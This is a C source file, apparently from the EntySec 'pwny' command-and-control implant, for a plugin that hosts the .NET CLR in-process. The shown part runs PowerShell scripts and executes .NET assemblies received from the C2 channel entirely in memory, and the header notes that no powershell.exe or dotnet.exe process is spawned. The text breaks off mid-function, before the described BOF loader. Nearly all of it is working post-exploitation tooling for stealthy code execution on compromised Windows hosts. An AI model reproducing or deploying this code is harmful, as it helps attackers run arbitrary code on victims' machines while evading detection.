/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Execute COT plugin — merged powershell + execute_assembly + bof_loader.
 *
 * Three execution backends:
 *   1. PowerShell     — in-memory CLR hosting, loads System.Management.Automation
 *                       from the GAC, runs commands via managed reflection.
 *   2. Execute Assembly — in-memory .NET assembly loading via CLR, invokes
 *                       the assembly's entry point with optional arguments.
 *   3. BOF Loader     — Beacon Object File (COFF .o) loader, maps sections,
 *                       processes relocations, calls the 'go' entry point.
 *
 * No powershell.exe / dotnet.exe processes are spawned — everything runs
 * in-process via COM vtable calls and direct memory manipulation.
 *
 * CLR vtable offsets target .NET Framework 4.x (Windows 10/11 standard).
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <pwny/log.h>

#include <windows.h>
#include <mscoree.h>
#include <oleauto.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ================================================================== */
/* Tags                                                                */
/* ================================================================== */

#define PS_EXECUTE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define EXECUTE_ASSEMBLY_RUN \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)

#define BOF_EXECUTE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 2)

/* ================================================================== */
/* Custom TLV types                                                    */
/* ================================================================== */

#define TLV_TYPE_PS_COMMAND TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_PS_OUTPUT  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)

/* ================================================================== */
/* Win32 function pointer types                                        */
/* ================================================================== */

/* kernel32.dll */
typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef int     (WINAPI *fn_MultiByteToWideChar)(UINT, DWORD, LPCCH, int,
                                                  LPWSTR, int);
typedef int     (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWCH, int,
                                                  LPSTR, int, LPCCH, LPBOOL);
typedef HMODULE (WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef LPVOID  (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fn_VirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL    (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE  (WINAPI *fn_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                          LPTHREAD_START_ROUTINE, LPVOID,
                                          DWORD, LPDWORD);
typedef DWORD   (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef BOOL    (WINAPI *fn_CloseHandle)(HANDLE);

/* ole32.dll */
typedef HRESULT (WINAPI *fn_CoInitializeEx)(LPVOID, DWORD);

/* oleaut32.dll */
typedef SAFEARRAY * (WINAPI *fn_SafeArrayCreate)(VARTYPE, UINT, SAFEARRAYBOUND *);
typedef HRESULT     (WINAPI *fn_SafeArrayAccessData)(SAFEARRAY *, void **);
typedef HRESULT     (WINAPI *fn_SafeArrayUnaccessData)(SAFEARRAY *);
typedef HRESULT     (WINAPI *fn_SafeArrayDestroy)(SAFEARRAY *);
typedef HRESULT     (WINAPI *fn_SafeArrayPutElement)(SAFEARRAY *, LONG *, void *);
typedef BSTR        (WINAPI *fn_SysAllocString)(const OLECHAR *);
typedef UINT        (WINAPI *fn_SysStringLen)(BSTR);
typedef void        (WINAPI *fn_SysFreeString)(BSTR);
typedef void        (WINAPI *fn_VariantInit)(VARIANTARG *);
typedef HRESULT     (WINAPI *fn_VariantClear)(VARIANTARG *);

/* msvcrt.dll */
typedef char * (__cdecl *fn__strdup)(const char *);

/* ================================================================== */
/* Unified function pointer struct                                     */
/* ================================================================== */

static struct
{
    /* kernel32.dll */
    fn_LoadLibraryA          pLoadLibraryA;
    fn_GetProcAddress        pGetProcAddress;
    fn_MultiByteToWideChar   pMultiByteToWideChar;
    fn_WideCharToMultiByte   pWideCharToMultiByte;
    fn_GetModuleHandleA      pGetModuleHandleA;
    fn_VirtualAlloc          pVirtualAlloc;
    fn_VirtualFree           pVirtualFree;
    fn_VirtualProtect        pVirtualProtect;
    fn_CreateThread          pCreateThread;
    fn_WaitForSingleObject   pWaitForSingleObject;
    fn_CloseHandle           pCloseHandle;

    /* ole32.dll */
    fn_CoInitializeEx        pCoInitializeEx;

    /* oleaut32.dll */
    fn_SafeArrayCreate       pSafeArrayCreate;
    fn_SafeArrayAccessData   pSafeArrayAccessData;
    fn_SafeArrayUnaccessData pSafeArrayUnaccessData;
    fn_SafeArrayDestroy      pSafeArrayDestroy;
    fn_SafeArrayPutElement   pSafeArrayPutElement;
    fn_SysAllocString        pSysAllocString;
    fn_SysStringLen          pSysStringLen;
    fn_SysFreeString         pSysFreeString;
    fn_VariantInit           pVariantInit;
    fn_VariantClear          pVariantClear;

    /* msvcrt.dll */
    fn__strdup               p_strdup;
} w;

/* ================================================================== */
/* GUIDs for CLR hosting (shared by powershell + execute_assembly)     */
/* ================================================================== */

static const GUID ex_CLSID_CLRMetaHost = {
    0x9280188d, 0x0e8e, 0x4867,
    {0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}
};
static const GUID ex_IID_ICLRMetaHost = {
    0xD332DB9E, 0xB9B3, 0x4125,
    {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}
};
static const GUID ex_IID_ICLRRuntimeInfo = {
    0xBD39D1D2, 0xBA2F, 0x486a,
    {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}
};
static const GUID ex_IID_ICLRRuntimeHost = {
    0x90F1A06C, 0x7712, 0x4762,
    {0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02}
};
static const GUID ex_CLSID_CorRuntimeHost = {
    0xcb2f6723, 0xab3a, 0x11d2,
    {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}
};
static const GUID ex_IID_ICorRuntimeHost = {
    0xcb2f6722, 0xab3a, 0x11d2,
    {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}
};
static const GUID ex_IID_AppDomain = {
    0x05F696DC, 0x2B29, 0x3663,
    {0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13}
};
static const GUID ex_IID_Assembly = {
    0x17156360, 0x2f1a, 0x384a,
    {0xbc, 0x52, 0xfd, 0xe9, 0x3c, 0x21, 0x5c, 0x5b}
};
static const GUID ex_IID_MethodInfo = {
    0xFFCC1B5D, 0xECB8, 0x38DD,
    {0x9B, 0x01, 0x3D, 0xC8, 0xAB, 0xC2, 0xAA, 0x5F}
};

/* ================================================================== */
/* COM vtable definitions                                              */
/* ================================================================== */

typedef struct _ICLRMetaHostVtbl
{
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *This, REFIID riid, void **ppv);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void *This);
    ULONG   (STDMETHODCALLTYPE *Release)(void *This);
    HRESULT (STDMETHODCALLTYPE *GetRuntime)(void *This, LPCWSTR pwzVersion,
             REFIID riid, void **ppRuntime);
    void *padding[8];
} ICLRMetaHostVtbl;

typedef struct { ICLRMetaHostVtbl *lpVtbl; } ICLRMetaHost;

typedef struct _ICLRRuntimeInfoVtbl
{
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *This, REFIID riid, void **ppv);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void *This);
    ULONG   (STDMETHODCALLTYPE *Release)(void *This);
    HRESULT (STDMETHODCALLTYPE *GetVersionString)(void *This, LPWSTR pBuffer,
             DWORD *pcchBuffer);
    HRESULT (STDMETHODCALLTYPE *GetRuntimeDirectory)(void *This, LPWSTR pBuffer,
             DWORD *pcchBuffer);
    HRESULT (STDMETHODCALLTYPE *IsLoaded)(void *This, HANDLE hndProcess, BOOL *pbLoaded);
    HRESULT (STDMETHODCALLTYPE *LoadErrorString)(void *This, UINT iResourceID,
             LPWSTR pBuffer, DWORD *pcchBuffer, LONG iLocaleID);
    HRESULT (STDMETHODCALLTYPE *LoadLibraryA_)(void *This, LPCWSTR pwzDllName,
             HMODULE *phndModule);
    HRESULT (STDMETHODCALLTYPE *GetProcAddress_)(void *This, LPCSTR pszProcName,
             LPVOID *ppProc);
    HRESULT (STDMETHODCALLTYPE *GetInterface)(void *This, REFCLSID rclsid,
             REFIID riid, void **ppUnk);
    HRESULT (STDMETHODCALLTYPE *IsLoadable)(void *This, BOOL *pbLoadable);
    HRESULT (STDMETHODCALLTYPE *SetDefaultStartupFlags)(void *This, DWORD dwStartupFlags,
             LPCWSTR pwzHostConfigFile);
    HRESULT (STDMETHODCALLTYPE *GetDefaultStartupFlags)(void *This, DWORD *pdwStartupFlags,
             LPWSTR pwzHostConfigFile, DWORD *pcchHostConfigFile);
    HRESULT (STDMETHODCALLTYPE *BindAsLegacyV2Runtime)(void *This);
} ICLRRuntimeInfoVtbl;

typedef struct { ICLRRuntimeInfoVtbl *lpVtbl; } ICLRRuntimeInfo;

/*
 * _AppDomain vtable — we need:
 *   slot 44: Load_2(BSTR assemblyString) → _Assembly  (used by PowerShell)
 *   slot 45: Load_3(SAFEARRAY rawAssembly) → _Assembly (used by Execute Assembly)
 *
 * Offsets target .NET Framework 4.x (Windows 10/11 standard).
 */
typedef struct _EX_AppDomainVtbl
{
    void *slots[44];
    HRESULT (STDMETHODCALLTYPE *Load_2)(void *This, BSTR assemblyString,
                                         void **ppAssembly);
    HRESULT (STDMETHODCALLTYPE *Load_3)(void *This, SAFEARRAY *rawAssembly,
                                         void **ppAssembly);
    void *rest[30];
} EX_AppDomainVtbl;

typedef struct { EX_AppDomainVtbl *lpVtbl; } EX_AppDomain;

/*
 * _Assembly vtable — we need:
 *   slot 17: get_EntryPoint → _MethodInfo  (used by Execute Assembly)
 *   slot 18: GetType_2(BSTR name) → _Type  (used by PowerShell)
 */
typedef struct _EX_AssemblyVtbl
{
    void *slots[17];
    HRESULT (STDMETHODCALLTYPE *get_EntryPoint)(void *This,
             void **ppMethodInfo);
    HRESULT (STDMETHODCALLTYPE *GetType_2)(void *This, BSTR name,
                                            void **ppType);
    void *rest[30];
} EX_AssemblyVtbl;

typedef struct { EX_AssemblyVtbl *lpVtbl; } EX_Assembly;

/*
 * _Type vtable — slot 56: InvokeMember_2 (PowerShell only)
 *   HRESULT InvokeMember_2(
 *       BSTR name,
 *       BindingFlags invokeAttr,
 *       _Binder* Binder,
 *       VARIANT Target,
 *       SAFEARRAY(VARIANT) args,
 *       [out,retval] VARIANT* pRetVal
 *   )
 */
typedef struct _PS_TypeVtbl
{
    void *slots[56];
    HRESULT (STDMETHODCALLTYPE *InvokeMember_2)(
        void *This,
        BSTR name,
        int invokeAttr,
        void *pBinder,
        VARIANT Target,
        SAFEARRAY *args,
        VARIANT *pRetVal);
    void *rest[30];
} PS_TypeVtbl;

typedef struct { PS_TypeVtbl *lpVtbl; } PS_Type;

/*
 * _MethodInfo vtable — slot 64: Invoke_3 (Execute Assembly only)
 */
typedef struct _MethodInfoVtbl
{
    void *slots[64];
    HRESULT (STDMETHODCALLTYPE *Invoke_3)(void *This, VARIANT obj,
             SAFEARRAY *parameters, VARIANT *result);
    void *rest[10];
} MethodInfoVtbl;

typedef struct { MethodInfoVtbl *lpVtbl; } MethodInfo;

typedef HRESULT (STDMETHODCALLTYPE *pfnCLRCreateInstance)(
    REFCLSID clsid, REFIID riid, LPVOID *ppInterface);

/* ================================================================== */
/* Shared CLR bootstrap (with v2 fallback)                             */
/* ================================================================== */

static HRESULT ex_get_runtime(ICorRuntimeHost **ppCorHost)
{
    HMODULE hMscoree;
    HRESULT hr;

    hMscoree = w.pLoadLibraryA("mscoree.dll");
    if (hMscoree == NULL)
    {
        return E_FAIL;
    }

    /* Try v4+ path */
    {
        pfnCLRCreateInstance pCLRCreateInstance;
        ICLRMetaHost *pMetaHost = NULL;
        ICLRRuntimeInfo *pRuntimeInfo = NULL;

        pCLRCreateInstance = (pfnCLRCreateInstance)w.pGetProcAddress(
            hMscoree, "CLRCreateInstance");

        if (pCLRCreateInstance != NULL)
        {
            hr = pCLRCreateInstance(&ex_CLSID_CLRMetaHost,
                                    &ex_IID_ICLRMetaHost,
                                    (void **)&pMetaHost);
            if (SUCCEEDED(hr) && pMetaHost != NULL)
            {
                hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, L"v4.0.30319",
                         &ex_IID_ICLRRuntimeInfo, (void **)&pRuntimeInfo);

                if (FAILED(hr) || pRuntimeInfo == NULL)
                {
                    hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, L"v2.0.50727",
                             &ex_IID_ICLRRuntimeInfo, (void **)&pRuntimeInfo);
                }

                if (SUCCEEDED(hr) && pRuntimeInfo != NULL)
                {
                    hr = pRuntimeInfo->lpVtbl->GetInterface(
                             pRuntimeInfo,
                             &ex_CLSID_CorRuntimeHost,
                             &ex_IID_ICorRuntimeHost,
                             (void **)ppCorHost);

                    pRuntimeInfo->lpVtbl->Release(pRuntimeInfo);
                }

                pMetaHost->lpVtbl->Release(pMetaHost);

                if (SUCCEEDED(hr) && *ppCorHost != NULL)
                {
                    (*ppCorHost)->lpVtbl->Start(*ppCorHost);
                    return S_OK;
                }
            }
        }
    }

    /* Fallback: v2 CorBindToRuntimeEx */
    {
        typedef HRESULT (STDMETHODCALLTYPE *pfnCorBindToRuntimeEx)(
            LPCWSTR, LPCWSTR, DWORD, REFCLSID, REFIID, LPVOID *);
        pfnCorBindToRuntimeEx pCorBind;

        pCorBind = (pfnCorBindToRuntimeEx)w.pGetProcAddress(
            hMscoree, "CorBindToRuntimeEx");

        if (pCorBind != NULL)
        {
            hr = pCorBind(L"v2.0.50727", L"wks", 0,
                          &ex_CLSID_CorRuntimeHost,
                          &ex_IID_ICorRuntimeHost,
                          (void **)ppCorHost);

            if (SUCCEEDED(hr) && *ppCorHost != NULL)
            {
                (*ppCorHost)->lpVtbl->Start(*ppCorHost);
                return S_OK;
            }
        }
    }

    return E_FAIL;
}

/* ================================================================== */
/*                                                                     */
/*  1. POWERSHELL                                                      */
/*                                                                     */
/* ================================================================== */

/* BindingFlags values */
#define BF_InvokeMethod  0x0100
#define BF_Static        0x0008
#define BF_Public        0x0010
#define BF_Instance      0x0004
#define BF_OptionalParamBinding 0x00040000
#define BF_FlattenHierarchy 0x0040

/* ---- PowerShell helpers ---- */

static void variant_from_unknown(VARIANT *v, IUnknown *pUnk)
{
    w.pVariantInit(v);
    V_VT(v) = VT_UNKNOWN;
    V_UNKNOWN(v) = pUnk;
}

static void variant_from_dispatch(VARIANT *v, IDispatch *pDisp)
{
    w.pVariantInit(v);
    V_VT(v) = VT_DISPATCH;
    V_DISPATCH(v) = pDisp;
}

static SAFEARRAY *make_variant_array_bstr(BSTR bstr)
{
    SAFEARRAYBOUND bound;
    SAFEARRAY *psa;
    VARIANT v;
    LONG idx = 0;

    bound.lLbound = 0;
    bound.cElements = 1;
    psa = w.pSafeArrayCreate(VT_VARIANT, 1, &bound);
    if (psa == NULL)
        return NULL;

    w.pVariantInit(&v);
    V_VT(&v) = VT_BSTR;
    V_BSTR(&v) = bstr;

    w.pSafeArrayPutElement(psa, &idx, &v);
    return psa;
}

static int variant_to_utf8(VARIANT *v, char *buf, int bufsz)
{
    BSTR bstr = NULL;
    int len;

    if (V_VT(v) == VT_BSTR)
    {
        bstr = V_BSTR(v);
    }
    else if (V_VT(v) == (VT_BSTR | VT_BYREF))
    {
        bstr = *V_BSTRREF(v);
    }

    if (bstr == NULL)
    {
        buf[0] = '\0';
        return 0;
    }

    len = w.pWideCharToMultiByte(CP_UTF8, 0, bstr, -1,
                                  buf, bufsz, NULL, NULL);
    if (len <= 0)
    {
        buf[0] = '\0';
        return 0;
    }

    return len - 1; /* exclude null terminator */
}

/* ---- PowerShell handler ---- */

static tlv_pkt_t *ps_execute(c2_t *c2)
{
    char command[16384];
    wchar_t wcommand[16384];

    ICorRuntimeHost *pCorHost = NULL;
    IUnknown *pUnkDomain = NULL;
    EX_AppDomain *pAppDomain = NULL;
    EX_Assembly *pAutomation = NULL;
    PS_Type *pPSType = NULL;

    HRESULT hr;
    VARIANT vEmpty, vResult, vPS, vPipeline;
    BSTR bstrAssembly = NULL;
    BSTR bstrTypeName = NULL;
    BSTR bstrCreate = NULL;
    BSTR bstrAddScript = NULL;
    BSTR bstrInvoke = NULL;
    BSTR bstrToString = NULL;
    BSTR bstrCommand = NULL;
    SAFEARRAY *psaArgs = NULL;

    char output[65536];
    int output_len = 0;
    tlv_pkt_t *result;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PS_COMMAND, command) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    /* Convert command to wide string */
    w.pMultiByteToWideChar(CP_UTF8, 0, command, -1, wcommand, 16384);

    /* Boot the CLR */
    w.pCoInitializeEx(NULL, COINIT_MULTITHREADED);

    hr = ex_get_runtime(&pCorHost);
    if (FAILED(hr))
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Get default AppDomain */
    hr = pCorHost->lpVtbl->GetDefaultDomain(pCorHost, &pUnkDomain);
    if (FAILED(hr) || pUnkDomain == NULL)
        goto fail;

    hr = pUnkDomain->lpVtbl->QueryInterface(pUnkDomain,
             &ex_IID_AppDomain, (void **)&pAppDomain);
    pUnkDomain->lpVtbl->Release(pUnkDomain);
    if (FAILED(hr) || pAppDomain == NULL)
        goto fail;

    /* Load System.Management.Automation from GAC */
    bstrAssembly = w.pSysAllocString(
        L"System.Management.Automation, Version=3.0.0.0, "
        L"Culture=neutral, PublicKeyToken=31bf3856ad364e35");

    hr = pAppDomain->lpVtbl->Load_2(pAppDomain, bstrAssembly,
                                      (void **)&pAutomation);
    w.pSysFreeString(bstrAssembly);

    if (FAILED(hr) || pAutomation == NULL)
    {
        log_debug("* powershell: Load_2 failed (0x%lx)\n",
                  (unsigned long)hr);
        goto fail;
    }

    /* Get the PowerShell type */
    bstrTypeName = w.pSysAllocString(
        L"System.Management.Automation.PowerShell");

    hr = pAutomation->lpVtbl->GetType_2(pAutomation, bstrTypeName,
                                          (void **)&pPSType);
    w.pSysFreeString(bstrTypeName);

    if (FAILED(hr) || pPSType == NULL)
    {
        log_debug("* powershell: GetType_2 failed (0x%lx)\n",
                  (unsigned long)hr);
        goto fail;
    }

    /* PowerShell.Create() — static method, no args */
    w.pVariantInit(&vEmpty);
    w.pVariantInit(&vResult);
    w.pVariantInit(&vPS);
    w.pVariantInit(&vPipeline);

    bstrCreate = w.pSysAllocString(L"Create");

    hr = pPSType->lpVtbl->InvokeMember_2(
        pPSType,
        bstrCreate,
        BF_InvokeMethod | BF_Static | BF_Public,
        NULL,
        vEmpty,  /* null target for static call */
        NULL,    /* no args */
        &vPS);

    w.pSysFreeString(bstrCreate);

    if (FAILED(hr))
    {
        log_debug("* powershell: Create() failed (0x%lx)\n",
                  (unsigned long)hr);
        goto fail;
    }

    /* ps.AddScript(command) — instance method */
    bstrAddScript = w.pSysAllocString(L"AddScript");
    bstrCommand = w.pSysAllocString(wcommand);
    psaArgs = make_variant_array_bstr(bstrCommand);

    hr = pPSType->lpVtbl->InvokeMember_2(
        pPSType,
        bstrAddScript,
        BF_InvokeMethod | BF_Instance | BF_Public,
        NULL,
        vPS,
        psaArgs,
        &vPipeline);

    w.pSysFreeString(bstrAddScript);
    w.pSysFreeString(bstrCommand);
    if (psaArgs) w.pSafeArrayDestroy(psaArgs);

    if (FAILED(hr))
    {
        log_debug("* powershell: AddScript() failed (0x%lx)\n",
                  (unsigned long)hr);
        goto fail;
    }

    /* pipeline.Invoke() — call Invoke on the result */
    {
        VARIANT vInvokeResult;
        w.pVariantInit(&vInvokeResult);

        bstrInvoke = w.pSysAllocString(L"Invoke");

        /* Invoke on the PowerShell object (vPS has the same instance) */
        hr = pPSType->lpVtbl->InvokeMember_2(
            pPSType,
            bstrInvoke,
            BF_InvokeMethod | BF_Instance | BF_Public,
            NULL,
            vPS,
            NULL,
            &vInvokeResult);

        w.pSysFreeString(bstrInvoke);

        if (FAILED(hr))
        {
            log_debug("* powershell: Invoke() failed (0x%lx)\n",
                      (unsigned long)hr);
            goto fail;
        }

        /* Convert results to string by calling ToString on results */
        if (V_VT(&vInvokeResult) == VT_DISPATCH ||
            V_VT(&vInvokeResult) == VT_UNKNOWN)
        {
            IDispatch *pResults = NULL;
            VARIANT vStr;
            w.pVariantInit(&vStr);

            if (V_VT(&vInvokeResult) == VT_DISPATCH)
                pResults = V_DISPATCH(&vInvokeResult);

            if (pResults != NULL)
            {
                DISPID dispid;
                OLECHAR *szToString = L"ToString";
                DISPPARAMS params = {NULL, NULL, 0, 0};

                hr = pResults->lpVtbl->GetIDsOfNames(pResults,
                         &IID_NULL, &szToString, 1,
                         LOCALE_USER_DEFAULT, &dispid);

                if (SUCCEEDED(hr))
                {
                    pResults->lpVtbl->Invoke(pResults, dispid,
                        &IID_NULL, LOCALE_USER_DEFAULT,
                        DISPATCH_METHOD, &params, &vStr, NULL, NULL);

                    output_len = variant_to_utf8(&vStr, output,
                                                  sizeof(output));
                    w.pVariantClear(&vStr);
                }
            }
        }
        else
        {
            output_len = variant_to_utf8(&vInvokeResult, output,
                                          sizeof(output));
        }

        w.pVariantClear(&vInvokeResult);
    }

    /* Dispose: ps.Dispose() */
    {
        BSTR bstrDispose = w.pSysAllocString(L"Dispose");
        VARIANT vDiscard;
        w.pVariantInit(&vDiscard);

        pPSType->lpVtbl->InvokeMember_2(
            pPSType,
            bstrDispose,
            BF_InvokeMethod | BF_Instance | BF_Public,
            NULL, vPS, NULL, &vDiscard);

        w.pSysFreeString(bstrDispose);
        w.pVariantClear(&vDiscard);
    }

    /* Cleanup */
    w.pVariantClear(&vPS);
    w.pVariantClear(&vPipeline);

    if (pPSType) ((IUnknown *)(void *)pPSType)->lpVtbl->Release(
        (IUnknown *)(void *)pPSType);
    if (pAutomation) ((IUnknown *)(void *)pAutomation)->lpVtbl->Release(
        (IUnknown *)(void *)pAutomation);
    if (pAppDomain) ((IUnknown *)(void *)pAppDomain)->lpVtbl->Release(
        (IUnknown *)(void *)pAppDomain);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_string(result, TLV_TYPE_PS_OUTPUT,
                        output_len > 0 ? output : "(no output)");
    return result;

fail:
    if (pPSType) ((IUnknown *)(void *)pPSType)->lpVtbl->Release(
        (IUnknown *)(void *)pPSType);
    if (pAutomation) ((IUnknown *)(void *)pAutomation)->lpVtbl->Release(
        (IUnknown *)(void *)pAutomation);
    if (pAppDomain) ((IUnknown *)(void *)pAppDomain)->lpVtbl->Release(
        (IUnknown *)(void *)pAppDomain);
    if (pCorHost)
    {
        pCorHost->lpVtbl->Stop(pCorHost);
        pCorHost->lpVtbl->Release(pCorHost);
    }

    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
}

/* ================================================================== */
/*                                                                     */
/*  2. EXECUTE ASSEMBLY                                                */
/*                                                                     */
/* ================================================================== */

/* ---- Execute Assembly helpers ---- */

static SAFEARRAY *execute_assembly_build_args(const char *argv)
{
    SAFEARRAY *psa;
    SAFEARRAYBOUND bound;
    LONG idx;
    BSTR bstr;
    wchar_t wbuf[4096];
    int wlen;

    if (argv == NULL || *argv == '\0')
    {
        bound.lLbound = 0;
        bound.cElements = 0;
        return w.pSafeArrayCreate(VT_BSTR, 1, &bound);
    }

    wlen = w.pMultiByteToWideChar(CP_UTF8, 0, argv, -1, wbuf, 4096);
    if (wlen <= 0)
    {
        return NULL;
    }

    bound.lLbound = 0;
    bound.cElements = 1;
    psa = w.pSafeArrayCreate(VT_BSTR, 1, &bound);

    if (psa == NULL)
    {
        return NULL;
    }

    bstr = w.pSysAllocString(wbuf);
    idx = 0;
    w.pSafeArrayPutElement(psa, &idx, bstr);
    w.pSysFreeString(bstr);

    return psa;
}

/* ---- Execute Assembly handler ---- */

static tlv_pkt_t *execute_assembly_run(c2_t *c2)
{
    int asm_size;
    unsigned char *asm_data = NULL;
    char *args_str = NULL;

    ICorRuntimeHost *pCorHost = NULL;
    IUnknown *pUnkDomain = NULL;
    EX_AppDomain *pAppDomain = NULL;
    EX_Assembly *pAssembly = NULL;
    MethodInfo *pEntryPoint = NULL;

    SAFEARRAY *psaImage = NULL;
    SAFEARRAY *psaArgs = NULL;
    SAFEARRAYBOUND bound;
    void *pData;

    VARIANT vEmpty;
    VARIANT vArgs;
    VARIANT vResult;

    HRESULT hr;

    asm_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &asm_data);
    if (asm_size <= 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Optional arguments string */
    {
        char buf[8192];
        if (tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, buf) >= 0)
        {
            args_str = w.p_strdup(buf);
        }
    }

    /* Boot the CLR */
    w.pCoInitializeEx(NULL, COINIT_MULTITHREADED);

    hr = ex_get_runtime(&pCorHost);
    if (FAILED(hr) || pCorHost == NULL)
    {
        log_debug("* execute_assembly: failed to initialize CLR (0x%lx)\n",
                  (unsigned long)hr);
        free(asm_data);
        if (args_str) free(args_str);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Get the default AppDomain */

    hr = pCorHost->lpVtbl->GetDefaultDomain(pCorHost, &pUnkDomain);
    if (FAILED(hr) || pUnkDomain == NULL)
    {
        log_debug("* execute_assembly: GetDefaultDomain failed (0x%lx)\n",
                  (unsigned long)hr);
        goto ea_fail;
    }

    hr = pUnkDomain->lpVtbl->QueryInterface(pUnkDomain,
             &ex_IID_AppDomain, (void **)&pAppDomain);
    pUnkDomain->lpVtbl->Release(pUnkDomain);

    if (FAILED(hr) || pAppDomain == NULL)
    {
        log_debug("* execute_assembly: QI for _AppDomain failed (0x%lx)\n",
                  (unsigned long)hr);
        goto ea_fail;
    }

    /* Wrap the assembly bytes in a SAFEARRAY(VT_UI1) */

    bound.lLbound = 0;
    bound.cElements = (ULONG)asm_size;
    psaImage = w.pSafeArrayCreate(VT_UI1, 1, &bound);

    if (psaImage == NULL)
    {
        log_debug("* execute_assembly: SafeArrayCreate failed\n");
        goto ea_fail;
    }

    hr = w.pSafeArrayAccessData(psaImage, &pData);
    if (FAILED(hr))
    {
        goto ea_fail;
    }

    memcpy(pData, asm_data, asm_size);
    w.pSafeArrayUnaccessData(psaImage);
    free(asm_data);
    asm_data = NULL;

    /* Load the assembly */

    hr = pAppDomain->lpVtbl->Load_3(pAppDomain, psaImage,
             (void **)&pAssembly);
    w.pSafeArrayDestroy(psaImage);
    psaImage = NULL;

    if (FAILED(hr) || pAssembly == NULL)
    {
        log_debug("* execute_assembly: Load_3 failed (0x%lx)\n",
                  (unsigned long)hr);
        goto ea_fail;
    }

    /* Get the entry point */

    hr = pAssembly->lpVtbl->get_EntryPoint(pAssembly,
             (void **)&pEntryPoint);
    if (FAILED(hr) || pEntryPoint == NULL)
    {
        log_debug("* execute_assembly: get_EntryPoint failed (0x%lx)\n",
                  (unsigned long)hr);
        goto ea_fail;
    }

    /* Build the args array */

    psaArgs = execute_assembly_build_args(args_str);
    if (args_str)
    {
        free(args_str);
        args_str = NULL;
    }

    /* Invoke: MethodInfo.Invoke(null, new object[] { args }) */

    w.pVariantInit(&vEmpty);
    w.pVariantInit(&vArgs);
    w.pVariantInit(&vResult);

    if (psaArgs != NULL && psaArgs->rgsabound[0].cElements > 0)
    {
        SAFEARRAY *psaOuter;
        SAFEARRAYBOUND outer_bound;

        outer_bound.lLbound = 0;
        outer_bound.cElements = 1;
        psaOuter = w.pSafeArrayCreate(VT_VARIANT, 1, &outer_bound);

        if (psaOuter != NULL)
        {
            VARIANT vInner;
            LONG idx = 0;

            w.pVariantInit(&vInner);
            V_VT(&vInner) = VT_ARRAY | VT_BSTR;
            V_ARRAY(&vInner) = psaArgs;

            w.pSafeArrayPutElement(psaOuter, &idx, &vInner);

            hr = pEntryPoint->lpVtbl->Invoke_3(pEntryPoint,
                     vEmpty, psaOuter, &vResult);

            w.pSafeArrayDestroy(psaOuter);
        }
        else
        {
            hr = pEntryPoint->lpVtbl->Invoke_3(pEntryPoint,
                     vEmpty, NULL, &vResult);
        }
    }
    else
    {
        SAFEARRAY *psaOuter;
